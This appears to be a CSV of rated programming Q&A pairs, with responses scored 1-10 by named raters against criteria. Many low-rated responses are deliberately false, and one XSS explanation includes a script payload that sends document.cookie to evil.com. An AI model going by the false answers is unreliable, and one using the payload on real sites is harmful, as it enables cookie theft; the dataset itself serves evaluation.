prompt,response,quality_rating,criteria,human_rater
Explain what precision and recall are and when to optimize for each,"Confusion matrix:
               Predicted+   Predicted-
Actual+  |    TP (hit)  |  FN (miss)  |
Actual-  |    FP (FA)   |  TN (correct) |

Precision = TP/(TP+FP)  — quality of positives
Recall    = TP/(TP+FN)  — coverage of actual positives

Tradeoff: raising classification threshold → higher precision, lower recall.
Lowering threshold → lower precision, higher recall.

Use PR-AUC instead of ROC-AUC for imbalanced datasets.",8,Is the precision/recall tradeoff explained correctly?,bob
What is a confusion matrix and what metrics can you derive from it?,"The matrix rows are actual classes, columns are predicted. Diagonal is correct predictions.",6,Are the confusion matrix and derived metrics explained correctly?,david
What is memoization and how do you implement it in Python?,Use functools.lru_cache to memoize expensive function calls automatically.,6,Is memoization implemented correctly with cache invalidation consideration?,david
How does Python's memory management and garbage collection work?,Python uses the same memory management as C.,2,Is Python's memory management explained correctly?,bob
What is the difference between interface and type in TypeScript?,Use interface for objects and classes. Use type for union types.,6,Is the distinction between interface and type accurate?,eve
What is Python's GIL and how does it affect multithreading?,"GIL workarounds:
1. multiprocessing: separate processes, each has own GIL
2. Cython with nogil: release GIL in C extensions
3. NumPy, Pandas: core operations release GIL
4. PyPy: alternative Python runtime (still has GIL but faster)
5. Python 3.13+: experimental free-threaded mode (GIL optional)

For most web apps: doesn't matter (I/O bound, async handles it fine).",9,Is the GIL explained correctly with practical implications?,eve
What is the difference between git fetch and git pull?,git pull is safer than git fetch.,1,Is the fetch vs pull distinction explained correctly?,carol
What is a Kubernetes Pod and how does it differ from a container?,"Single vs multi-container Pod:
Single: most common, one app container.
Sidecar pattern: main app + helper that enhances it.
  Example: app container + log-shipper sidecar (both read same log volume)
  Example: app + envoy proxy (service mesh)

Pods vs Deployments:
Never create Pods directly in production — use Deployment.
Deployment manages ReplicaSet which manages Pods.
If a Pod crashes, Deployment recreates it.",10,Is the Pod concept explained correctly?,david
Explain the Singleton design pattern and when to use it,Use Singleton for things like loggers and config objects that should only exist once.,6,Is the Singleton pattern explained correctly with appropriate caveats?,alice
How do you mock dependencies in Python unit tests?,"from unittest.mock import MagicMock
mock_db = MagicMock()
mock_db.query.return_value = [...]",7,Is mocking in Python explained correctly with practical examples?,carol
What is memoization and how do you implement it in Python?,Memoize all functions for best performance.,3,Is memoization implemented correctly with cache invalidation consideration?,alice
"Explain TypeScript utility types: Partial, Required, Pick, Omit",They are built-in TypeScript helpers for creating new types from existing ones.,5,Are the utility types explained correctly with examples?,bob
What is Python's GIL and how does it affect multithreading?,The GIL is a limitation in CPython that affects CPU-bound multithreaded programs.,7,Is the GIL explained correctly with practical implications?,carol
Explain the difference between BFS and DFS graph traversal,"from collections import deque

# BFS — shortest path
def bfs(graph, start):
    visited = {start}
    queue = deque([start])
    while queue:
        node = queue.popleft()
        for neighbor in graph[node]:
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)

# DFS — recursive
def dfs(graph, node, visited=None):
    if visited is None: visited = set()
    visited.add(node)
    for neighbor in graph[node]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited)",10,Is BFS vs DFS explained correctly with appropriate use cases?,david
What is Docker networking and how do containers communicate?,"Use the container's IP address, which is always 127.0.0.1.",1,Is Docker networking explained correctly with practical examples?,bob
What are pytest fixtures and how do you use them?,Use scope='session' for expensive fixtures that should be created once.,7,Are pytest fixtures explained correctly with scope and yielding?,alice
What are window functions in SQL and give an example,"Window frame specification:
ROWS BETWEEN 2 PRECEDING AND CURRENT ROW — last 3 rows
RANGE BETWEEN INTERVAL '7' DAY PRECEDING AND CURRENT ROW — last 7 days

SUM(revenue) OVER (
  PARTITION BY store_id
  ORDER BY date
  ROWS BETWEEN 6 PRECEDING AND CURRENT ROW
) AS weekly_rolling_sum",9,Is the window function concept explained correctly with a working example?,alice
What are Python decorators and how do you write one?,"Decorator with arguments (factory pattern):
def retry(max_attempts=3):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
        return wrapper
    return decorator

@retry(max_attempts=5)
def fetch_data(): ...",10,Is the decorator concept explained correctly with a working example?,carol
Implement a binary search algorithm in Python,"def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = left + (right - left) // 2  # avoids overflow
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    return -1  # not found

# Time: O(log n), Space: O(1)",8,Is the binary search implementation correct?,carol
Explain Python's property decorator,Use @property.setter to create class-level constants.,1,Is the property decorator explained correctly with getter/setter/deleter?,bob
What is the difference between git fetch and git pull?,Both commands are identical except git pull is faster.,1,Is the fetch vs pull distinction explained correctly?,carol
Implement a binary search algorithm in Python,"# Python built-in: bisect module
import bisect

arr = [1, 3, 5, 7, 9, 11]
target = 7
idx = bisect.bisect_left(arr, target)

if idx < len(arr) and arr[idx] == target:
    print(f'Found at index {idx}')
else:
    print('Not found')

# bisect_left: index for insertion to maintain sorted order",10,Is the binary search implementation correct?,carol
Explain Python's dataclasses and when to use them,"Inheritance:
@dataclass
class Animal:
    name: str
    species: str

@dataclass
class Dog(Animal):
    breed: str
    species: str = 'Canis lupus'

# Post-init processing:
@dataclass
class Circle:
    radius: float
    area: float = field(init=False)
    def __post_init__(self):
        self.area = 3.14159 * self.radius ** 2",10,Are dataclasses explained correctly with practical comparison to plain classes?,alice
Explain the difference between BFS and DFS graph traversal,BFS uses a queue and explores neighbors first. DFS uses a stack and explores as deep as possible.,5,Is BFS vs DFS explained correctly with appropriate use cases?,david
Explain CSS flexbox and when to use it vs CSS grid,"Flexbox is for one-dimensional layouts. Grid is for two-dimensional. Use flexbox for rows/columns, grid for page layouts.",6,Is flexbox vs grid explained correctly?,alice
What is XSS and how do you prevent it in a web application?,"XSS (Cross-Site Scripting): attacker injects malicious scripts into pages viewed by other users.

Types:
- Stored XSS: script saved in DB, served to all users
- Reflected XSS: script in URL parameter, reflected back
- DOM-based: client-side JS writes attacker input to DOM

Impact: steal cookies/tokens, keylogging, defacement, redirects.

Example:
Comment: <script>fetch('evil.com/steal?c='+document.cookie)</script>",9,Is the XSS explanation correct with practical prevention techniques?,david
What is a neural network and how does it learn?,Neural networks are like brains but computers. They have thinking layers.,2,Is the neural network and backpropagation explanation accurate?,david
What is GraphQL and how does it differ from REST?,"GraphQL advantages:
- No over-fetching: get only fields you request
- No under-fetching: get related data in one request
- Strongly typed schema
- Self-documenting (introspection)
- Easy API evolution (add fields, deprecate without versions)

GraphQL disadvantages:
- Complex caching (POST requests, no URL-based cache)
- Learning curve
- N+1 query problem (solve with DataLoader)
- Overkill for simple APIs",8,Is the GraphQL vs REST distinction explained correctly?,david
What is the difference between supervised and unsupervised learning?,"Supervised: trains on labeled data (X, y pairs). Model learns f(X) → y.
Examples: spam classification, house price prediction, image recognition.
Algorithms: linear regression, SVM, neural networks.

Unsupervised: no labels — find hidden structure in X.
Examples: customer segmentation, anomaly detection, topic modeling.
Algorithms: k-means, PCA, DBSCAN, autoencoders.",8,Is the distinction clear with good examples of each?,eve
Write a Python function to reverse a string,Use the reverse() method: s.reverse(),3,Is the response correct and Pythonic?,eve
Explain TCP vs UDP and when to use each,"TCP is for servers, UDP is for clients.",1,Is the TCP/UDP distinction accurate with appropriate use cases?,alice
"Explain TypeScript utility types: Partial, Required, Pick, Omit","Other useful utility types:
Readonly<T>: immutable object
Record<K, V>: object with known keys: Record<string, number>
ReturnType<F>: extract return type of a function
Parameters<F>: extract parameter tuple
NonNullable<T>: remove null and undefined
Exclude<T, U>: members of T not in U",10,Are the utility types explained correctly with examples?,alice
Explain Redis and common use cases for it,"Caching pattern:
# Cache-aside (lazy loading)
def get_user(user_id):
    cached = redis.get(f'user:{user_id}')
    if cached:
        return json.loads(cached)  # cache hit
    user = db.query(User).get(user_id)  # cache miss
    redis.setex(f'user:{user_id}', 300, json.dumps(user))  # 5 min TTL
    return user

TTL prevents stale data accumulation.",9,Is Redis explained correctly with practical use cases?,david
Explain dynamic programming with the Fibonacci sequence example,DP always uses recursion and doesn't need any additional data structures.,2,Is dynamic programming explained correctly with memoization and tabulation?,david
What is HTTPS and how does TLS work?,TLS and SSL are the same thing and both are current standards.,1,Is HTTPS/TLS explained correctly?,eve
What is transfer learning and why is it so powerful?,"NLP example (BERT/GPT):
# Pre-trained on 800GB of text — understands language structure
model = BertForSequenceClassification.from_pretrained('bert-base-uncased')

# Fine-tune on your 10,000 labeled sentiment examples
trainer = Trainer(model=model, train_dataset=your_data)
trainer.train()

Results in hours, not months. Outperforms training from scratch on small datasets.",10,Is transfer learning explained correctly?,alice
Explain CI/CD and the difference between continuous integration and continuous deployment,"CI/CD automates building, testing, and deploying software to reduce manual errors.",6,Is CI/CD explained accurately?,eve
What is the difference between interface and type in TypeScript?,They are exactly the same. Just pick one and be consistent.,2,Is the distinction between interface and type accurate?,david
How do you write parameterized tests in pytest?,Parametrize lets you run the same test with different inputs. Pass a list of tuples.,4,Is pytest parameterization explained correctly?,eve
Explain Python generators and when to use them,Generators are slower than lists so only use them for very large data.,1,Is the generator concept correct with a practical use case?,carol
What is a binary search tree and what are its time complexities?,"BST operations:
Search: start at root, go left if target < node, right if >, stop if equal.
Insert: search until null, insert there.
Delete: 3 cases — leaf (remove), one child (replace), two children (replace with inorder successor).

Inorder traversal visits nodes in sorted order — useful property for range queries.

Python: use sortedcontainers.SortedList or heapq for most practical use cases.",9,Is the BST explained correctly with accurate time complexity?,bob
Explain database normalization and the first three normal forms,Normalization means formatting your SQL queries correctly.,2,Is normalization explained correctly?,david
What are the main HTTP methods and when should each be used?,"GET    — Retrieve. Safe, idempotent, cacheable. GET /users/42
POST   — Create. Not idempotent. POST /users → 201
PUT    — Replace entirely. Idempotent. PUT /users/42
PATCH  — Partial update. PATCH /users/42 {email: ...}
DELETE — Remove. Idempotent. DELETE /users/42 → 204
HEAD   — Like GET but no body (check existence/headers)
OPTIONS — CORS preflight, returns allowed methods",10,Are the HTTP methods described accurately with correct use cases?,eve
What is horizontal scaling vs vertical scaling?,Horizontal scaling provides better fault tolerance. Vertical is simpler to implement.,7,Is the distinction accurate with tradeoffs explained?,david
What is a Kubernetes Pod and how does it differ from a container?,Pods are Kubernetes nodes that run your applications.,3,Is the Pod concept explained correctly?,alice
Explain the Singleton design pattern and when to use it,Singleton is the best design pattern and should be used everywhere.,2,Is the Singleton pattern explained correctly with appropriate caveats?,carol
Explain Big O notation and why it matters,"Space complexity matters too:
Recursive Fibonacci: O(2^n) time, O(n) space (call stack)
Memoized Fibonacci: O(n) time, O(n) space
Iterative Fibonacci: O(n) time, O(1) space

Amortized analysis: dynamic array append is O(1) amortized
(occasional O(n) resize averaged over many operations)",8,Is Big O explained correctly with common examples?,bob
How does prototypal inheritance work in JavaScript?,"Prototype chain lookup:
when you access obj.method, JS looks:
1. obj itself
2. obj.__proto__ (Dog.prototype)
3. obj.__proto__.__proto__ (Animal.prototype)
4. Object.prototype
5. null — property not found → undefined

Object.create(proto) creates object with proto as prototype.",10,Is the prototype chain explained correctly?,bob
How do you handle exceptions in Python?,"Catch specific exceptions first, broad ones last:
try:
    data = json.loads(text)
except json.JSONDecodeError:
    return None
except Exception as e:
    logger.error(e)
    raise",10,Does the response explain try/except correctly with good examples?,alice
How do you handle environment variables and secrets in a Python application?,Never commit .env files. Use environment variables for database passwords and API keys.,6,Is the secrets management guidance correct and secure?,eve
What are React hooks rules and why do they exist?,The two rules are: only at top level and only in React functions. This ensures consistent hook order.,5,Are the rules of hooks explained correctly with the underlying reason?,eve
What is a heap data structure and how does Python's heapq work?,"A heap is a complete binary tree satisfying the heap property:
Min-heap: parent ≤ children (root is minimum)
Max-heap: parent ≥ children (root is maximum)

Operations:
push: O(log n) — add and bubble up
pop: O(log n) — remove root, bubble down
peek: O(1) — view min/max without removing
build from list: O(n)",9,Is the heap and heapq explained correctly?,bob
"Explain Kubernetes Deployments, Services, and Ingress",Ingress is the same as a Load Balancer and they should not both be used.,3,Are these three core Kubernetes resources explained correctly?,alice
What are pytest fixtures and how do you use them?,Fixtures are the same as setUp() and tearDown() in unittest.,2,Are pytest fixtures explained correctly with scope and yielding?,bob
Explain the Singleton design pattern and when to use it,"Singleton: ensures only one instance of a class exists and provides a global access point.

Python implementation:
class Singleton:
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

s1 = Singleton()
s2 = Singleton()
assert s1 is s2  # True — same object",9,Is the Singleton pattern explained correctly with appropriate caveats?,eve
What is a heap data structure and how does Python's heapq work?,Heaps and BSTs are the same data structure.,3,Is the heap and heapq explained correctly?,eve
Explain Python's dataclasses and when to use them,"Dataclass options:
@dataclass(frozen=True)  # immutable, hashable
@dataclass(order=True)   # generates __lt__, __gt__, etc.
@dataclass(slots=True)   # uses __slots__ (Python 3.10+, faster)

Field options:
field(default=0)                    # simple default
field(default_factory=list)         # mutable default (avoids shared mutable)
field(repr=False)                   # exclude from __repr__
field(compare=False)                # exclude from __eq__",10,Are dataclasses explained correctly with practical comparison to plain classes?,bob
What is Docker networking and how do containers communicate?,Docker containers on the same network can communicate using container names.,6,Is Docker networking explained correctly with practical examples?,eve
How do you implement pagination in a REST API?,Always use offset 0 and increase the limit for more results.,3,Is pagination explained correctly with practical tradeoffs?,eve
Design a rate limiting system for an API,Rate limiting requires hardware load balancers.,2,Is the rate limiting design practical and complete?,carol
Explain database normalization and the first three normal forms,"2NF (Second Normal Form):
- Must be 1NF
- No partial dependencies (non-key attributes depend on whole primary key, not part of it)

Violation: OrderItem table with columns (order_id, product_id, product_name, quantity)
  product_name depends only on product_id, not on (order_id, product_id)
Fix: move product_name to Products table.

3NF (Third Normal Form):
- Must be 2NF
- No transitive dependencies (non-key attributes don't depend on other non-key attributes)",10,Is normalization explained correctly?,alice
What does the chmod command do and explain common permission modes,"Permissions are owner/group/others. Each has read(4), write(2), execute(1). Add them for the octal value.",5,Is the permission system correctly explained?,bob
How do you version a REST API and what are the tradeoffs?,"Internal vs external APIs:
Public APIs: version aggressively, support multiple versions for years
Internal APIs: versioning can be avoided with coordinated deploys

Hypermedia (HATEOAS): include links to next actions in response — clients discover API dynamically, less coupling to version.",8,Are API versioning strategies explained correctly?,david
What are database transactions and why do they matter?,"Deadlock: two transactions wait for each other's locks.
Prevention: always acquire locks in the same order.
Detection: DB kills one transaction (check for deadlock errors and retry).",9,Is ACID explained correctly with practical examples?,eve
Explain how a content delivery network (CDN) works,A CDN caches content at servers around the world so users get faster responses from nearby servers.,6,Is the CDN explanation correct and practical?,david
What is the CAP theorem in distributed systems?,CAP theorem means you need all three properties to build a good database.,3,Is the CAP theorem explained correctly?,eve
How does Python's memory management and garbage collection work?,"Python uses reference counting as primary memory management.
Each object has a refcount. When refcount drops to 0, object is freed.

import sys
x = [1, 2, 3]
sys.getrefcount(x)  # 2 (x + getrefcount's own ref)
y = x
sys.getrefcount(x)  # 3
del y
sys.getrefcount(x)  # 2",10,Is Python's memory management explained correctly?,eve
How do you mock dependencies in Python unit tests?,"spec= for safer mocks:
mock = MagicMock(spec=requests.Response)
# mock.nonexistent_attr → AttributeError (caught at test time)
# without spec: mock.anything → MagicMock (hides bugs)

side_effect for exceptions:
mock.get.side_effect = ConnectionError('timeout')

side_effect as iterable:
mock.randint.side_effect = [3, 7, 2]  # returns in sequence",10,Is mocking in Python explained correctly with practical examples?,eve
"Explain TypeScript utility types: Partial, Required, Pick, Omit","These are JavaScript features, not TypeScript-specific.",2,Are the utility types explained correctly with examples?,carol
What are Python decorators and how do you write one?,"Decorators are syntactic sugar for higher-order functions:
@decorator
def func(): ...
# is equivalent to:
func = decorator(func)

Practical example — timing decorator:
import time, functools

def timer(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        print(f'{func.__name__}: {time.perf_counter()-start:.3f}s')
        return result
    return wrapper",10,Is the decorator concept explained correctly with a working example?,eve
How does prototypal inheritance work in JavaScript?,Use Object.copy() to inherit from another object.,1,Is the prototype chain explained correctly?,eve
Explain the concept of regularization in machine learning,Regularization prevents overfitting by adding a penalty for large weights. L1 and L2 are the main types.,4,Is regularization explained correctly with L1 and L2 differences?,carol
Explain how a content delivery network (CDN) works,"When to use CDN:
✓ Serving images, videos, static assets
✓ Global user base
✓ High traffic (offload origin)
✓ DDoS protection (absorb attack at edge)
✗ Highly personalized, uncacheable responses",10,Is the CDN explanation correct and practical?,eve
What is memoization and how do you implement it in Python?,Memoization is the same as caching HTML pages.,2,Is memoization implemented correctly with cache invalidation consideration?,david
What is XSS and how do you prevent it in a web application?,"CSP blocks most XSS even if injection occurs:
Content-Security-Policy:
  default-src 'self';
  script-src 'self' cdn.trusted.com;
  object-src 'none';

Report-only mode for testing:
Content-Security-Policy-Report-Only: ...; report-uri /csp-report",8,Is the XSS explanation correct with practical prevention techniques?,david
Explain what precision and recall are and when to optimize for each,High precision = few false positives. High recall = few false negatives. Use F1 score to balance both.,5,Is the precision/recall tradeoff explained correctly?,carol
What is memoization and how do you implement it in Python?,"from functools import lru_cache
@lru_cache
def fn(n): ...",7,Is memoization implemented correctly with cache invalidation consideration?,eve
What is horizontal scaling vs vertical scaling?,Horizontal scaling means making the server wider and vertical means making it taller.,3,Is the distinction accurate with tradeoffs explained?,bob
How do you implement pagination in a REST API?,Offset pagination: ?page=1&limit=20. Cursor pagination is better for large datasets.,4,Is pagination explained correctly with practical tradeoffs?,alice
Write a JavaScript function to debounce another function,Use setInterval to debounce function calls.,3,Is the debounce implementation correct?,david
Explain async/await in Python and when to use asyncio,asyncio handles I/O operations concurrently in a single thread using an event loop.,7,Is async/await and asyncio explained correctly?,carol
Explain the Observer design pattern with a Python example,Observer pattern is used to watch files for changes on disk.,2,Is the Observer pattern implemented correctly?,bob
Explain the difference between BFS and DFS graph traversal,They are the same algorithm with different names.,3,Is BFS vs DFS explained correctly with appropriate use cases?,alice
Explain blue-green deployment and canary deployment,Canary deployment is named after the bird and means slow deployment.,1,Are the deployment strategies explained correctly?,alice
What is a neural network and how does it learn?,"Key hyperparameters:
- Learning rate: step size for weight updates
- Batch size: samples per gradient update
- Epochs: full passes over training data
- Architecture: number/size of layers
- Activation: ReLU (default), sigmoid (output), softmax (multiclass)",9,Is the neural network and backpropagation explanation accurate?,bob
Explain Big O notation and why it matters,O(1) is the slowest and O(n) is the fastest.,1,Is Big O explained correctly with common examples?,carol
Explain AWS S3 and when to use it vs a database,"S3 features:
- Versioning: keep old versions of objects
- Lifecycle rules: auto-move to Glacier after 90 days
- Event notifications: trigger Lambda on upload
- Static website hosting: serve HTML directly
- Server-side encryption: SSE-S3, SSE-KMS
- Access control: bucket policies, IAM, presigned URLs",8,Is the S3 vs database distinction explained correctly?,carol
How do you implement pagination in a REST API?,"Cursor pagination (scalable):
GET /posts?after=cursor_abc&limit=20

# cursor encodes the last item's position
SELECT * FROM posts WHERE id > :cursor ORDER BY id LIMIT 20

Response includes: 'next_cursor': 'cursor_xyz'

Pros: O(log n) with index, stable (new items don't shift pages)
Cons: no random page access, harder to implement",8,Is pagination explained correctly with practical tradeoffs?,carol
What is CSS specificity and how is it calculated?,"Comparing specificity:
p.intro { color: blue; }      → (0,0,1,1)
.intro { color: red; }        → (0,0,1,0)

p.intro wins → blue

!important overrides all specificity:
.btn { color: red !important; }  /* wins against inline styles */
Avoid !important — leads to specificity wars.",8,Is CSS specificity explained correctly?,david
Write a bash script to find all files larger than 100MB in a directory,find . -type f -size +100M | xargs ls -lh,6,Is the bash script correct and does it handle edge cases?,david
Design a rate limiting system for an API,"Use a token bucket algorithm. Add tokens over time, subtract on each request. Reject if empty.",6,Is the rate limiting design practical and complete?,david
How do you implement pagination in a REST API?,"Keyset pagination (variant of cursor):
GET /posts?after_id=500&limit=20

SELECT * FROM posts WHERE id > 500 ORDER BY id LIMIT 20

Simpler than encoded cursors.
Works well for simple monotonic IDs.",9,Is pagination explained correctly with practical tradeoffs?,bob
Write a bash script to find all files larger than 100MB in a directory,"#!/bin/bash
DIR=""${1:-.}""  # default to current directory

if [ ! -d ""$DIR"" ]; then
  echo ""Error: '$DIR' is not a directory"" >&2
  exit 1
fi

find ""$DIR"" -type f -size +100M -printf '%s\t%p\n' | \
  sort -rn | \
  awk '{printf ""%.0f MB\t%s\n"", $1/1024/1024, $2}'",8,Is the bash script correct and does it handle edge cases?,david
Explain the concept of regularization in machine learning,Regularization makes the model more regular by normalizing the input data.,3,Is regularization explained correctly with L1 and L2 differences?,bob
What is a confusion matrix and what metrics can you derive from it?,"Example:
1000 patients, 50 with disease
Model predicts: 40 TP, 10 FN, 30 FP, 920 TN

Accuracy  = (40+920)/1000 = 0.96  ← misleadingly high
Precision = 40/(40+30) = 0.57
Recall    = 40/(40+10) = 0.80     ← we want this high for disease
F1        = 2*(0.57*0.80)/(0.57+0.80) = 0.667

For disease: high recall critical (don't miss sick patients).",10,Are the confusion matrix and derived metrics explained correctly?,carol
"What is the difference between IaaS, PaaS, and SaaS?",SaaS is better than IaaS because you get more for your money.,1,Are the three cloud service models explained accurately?,eve
Explain the difference between git merge and git rebase,They do the same thing but rebase is faster.,2,Is the distinction accurate with implications for history?,bob
"Explain Kubernetes Deployments, Services, and Ingress","Use Deployment to run your app, Service to expose it inside the cluster, and Ingress to expose it externally.",4,Are these three core Kubernetes resources explained correctly?,david
What is cache invalidation and what strategies exist?,Set TTL on cached items so they expire. Or delete the cache key when the source data changes.,5,Are cache invalidation strategies explained correctly?,carol
What is the CAP theorem in distributed systems?,Distributed databases must choose between being consistent or always available when network partitions happen.,6,Is the CAP theorem explained correctly?,alice
Explain microservices vs monolithic architecture,"Monolithic: entire app deployed as one unit. All features in one process.
+ Simple to develop, test, deploy initially
+ No network latency between components
+ Easy to debug (single log stream)
- Scaling requires scaling everything
- Long build/deploy cycles at scale
- Tech stack locked in
- Large codebase becomes hard to navigate",9,Is the comparison accurate with honest tradeoffs?,alice
What are database transactions and why do they matter?,"Without transactions:
if server crashes between debit and credit → money disappears!

With transactions:
BEGIN TRANSACTION;
  UPDATE accounts SET balance -= 500 WHERE user='alice';
  UPDATE accounts SET balance += 500 WHERE user='bob';
COMMIT;

Isolation levels (tradeoffs between consistency and concurrency):
- READ UNCOMMITTED: see dirty reads
- READ COMMITTED: no dirty reads (PostgreSQL default)
- REPEATABLE READ: no phantom reads (MySQL default)
- SERIALIZABLE: fully isolated (slowest)",9,Is ACID explained correctly with practical examples?,carol
Write an async JavaScript function to fetch data from an API,"async function getData(url, options = {}) {
  const response = await fetch(url, {
    headers: { 'Content-Type': 'application/json' },
    ...options
  });
  if (!response.ok) throw new Error(`${response.status} ${response.statusText}`);
  return response.json();
}",10,Is the async/await usage correct and does it handle errors?,david
Explain JavaScript's 'this' keyword and how context works,Use bind() to fix 'this' context when passing methods as callbacks.,7,Is 'this' binding explained correctly with common pitfalls?,alice
Explain JavaScript closures with an example,"A closure is when a function can access variables outside its own scope.
function outer() { let x = 1; return () => x; }",4,Is the closure concept explained correctly with a working example?,carol
What is a Kubernetes Pod and how does it differ from a container?,A Pod is a group of one or more containers that run together on the same node and share network.,7,Is the Pod concept explained correctly?,carol
Explain the difference between React useState and useReducer,"useState is simpler, useReducer is for complex state. useReducer takes a reducer function and initial state.",7,Is the distinction between the hooks explained correctly?,alice
Implement a binary search algorithm in Python,Binary search works on sorted arrays by repeatedly halving the search space.,4,Is the binary search implementation correct?,eve
Explain JavaScript's 'this' keyword and how context works,"Arrow functions: 'this' inherited from enclosing scope (lexical this).

class Timer {
  constructor() { this.count = 0; }
  start() {
    // Arrow: this = Timer instance
    setInterval(() => this.count++, 1000);

    // Regular function: this = undefined or window
    setInterval(function() { this.count++; }, 1000);  // bug!
  }
}",8,Is 'this' binding explained correctly with common pitfalls?,eve
How do you write a good commit message?,"Good commit messages explain the why, not just the what. Keep subjects short.",5,Is the commit message guidance practical and correct?,carol
How do you write a good commit message?,Write a clear subject line under 50 characters. Add a body explaining why the change was made.,5,Is the commit message guidance practical and correct?,carol
Explain how a content delivery network (CDN) works,"A CDN caches static assets (images, JS, CSS, video) at edge servers close to users, reducing latency and origin server load.

Request flow without CDN:
User (Tokyo) → Origin server (Virginia) → 200ms round trip

With CDN:
User (Tokyo) → Edge node (Tokyo) → cache hit → 10ms
              → cache miss → fetch from origin, cache for next user

Purpose-built for:
- Static assets (images, CSS, JS)
- Large file downloads
- Video streaming (HLS)
- API acceleration (some CDNs)",10,Is the CDN explanation correct and practical?,alice
What is cache invalidation and what strategies exist?,Cache invalidation means removing old cached data when it changes. Common strategies are TTL and explicit deletion.,6,Are cache invalidation strategies explained correctly?,eve
Explain the difference between React useState and useReducer,useState is deprecated. Use useReducer instead.,2,Is the distinction between the hooks explained correctly?,bob
What is memoization and how do you implement it in Python?,Memoization requires a database to store results.,1,Is memoization implemented correctly with cache invalidation consideration?,carol
"Explain TypeScript utility types: Partial, Required, Pick, Omit",Partial<T> is useful for update operations where not all fields are required.,4,Are the utility types explained correctly with examples?,david
What happens when you type a URL in a browser and press Enter?,DNS converts the URL to a webpage. The browser displays the result.,1,Is the full request lifecycle explained correctly?,bob
Write a Python context manager for database transactions,"Nested transactions with savepoints:
from contextlib import contextmanager

@contextmanager
def savepoint(db, name='sp'):
    db.execute(f'SAVEPOINT {name}')
    try:
        yield
        db.execute(f'RELEASE SAVEPOINT {name}')
    except Exception:
        db.execute(f'ROLLBACK TO SAVEPOINT {name}')
        raise",8,Is the context manager implemented correctly?,david
How do you handle environment variables and secrets in a Python application?,"Never hardcode secrets in source code. Use environment variables.

# .env file (never commit to git)
DATABASE_URL=postgresql://user:pass@localhost/db
SECRET_KEY=abc123

# Load with python-dotenv
from dotenv import load_dotenv
load_dotenv()

import os
DB_URL = os.environ['DATABASE_URL']  # KeyError if missing — explicit
DB_URL = os.getenv('DATABASE_URL', 'sqlite:///default.db')  # with default",9,Is the secrets management guidance correct and secure?,alice
Explain CI/CD and the difference between continuous integration and continuous deployment,You need to buy CI/CD software. It cannot be set up for free.,2,Is CI/CD explained accurately?,bob
Write a Python function to check if a string is a palindrome,"def is_palindrome(s: str) -> bool:
    cleaned = ''.join(c.lower() for c in s if c.isalnum())
    return cleaned == cleaned[::-1]",9,Is the implementation correct and efficient?,carol
What is the React useEffect hook and how do you use it correctly?,useEffect runs side effects after rendering. The dependency array controls when it re-runs.,4,Is useEffect explained correctly with cleanup and dependency array?,carol
How does Python's memory management and garbage collection work?,"__del__ finalizers: called when object is garbage collected.
Warning: __del__ is unreliable with cyclic garbage collector — may never be called.
Use context managers (with/close()) for resource cleanup instead.

import weakref  # reference without increasing refcount
weak = weakref.ref(obj)
weak()  # returns obj or None if collected",10,Is Python's memory management explained correctly?,bob
What is the CAP theorem in distributed systems?,CP databases sacrifice availability for consistency. AP databases sacrifice consistency for availability.,5,Is the CAP theorem explained correctly?,alice
What are window functions in SQL and give an example,RANK() OVER (PARTITION BY dept ORDER BY salary DESC) ranks employees within departments.,7,Is the window function concept explained correctly with a working example?,carol
Explain Python's dataclasses and when to use them,Use @dataclass instead of writing __init__ manually. Saves code and reduces errors.,7,Are dataclasses explained correctly with practical comparison to plain classes?,eve
What is git stash and when would you use it?,Use git stash when you need a clean working directory but don't want to commit yet.,5,Is git stash explained correctly with practical use cases?,bob
What is HTTPS and how does TLS work?,HTTPS protects data in transit from eavesdropping. Use it for all production websites.,6,Is HTTPS/TLS explained correctly?,eve
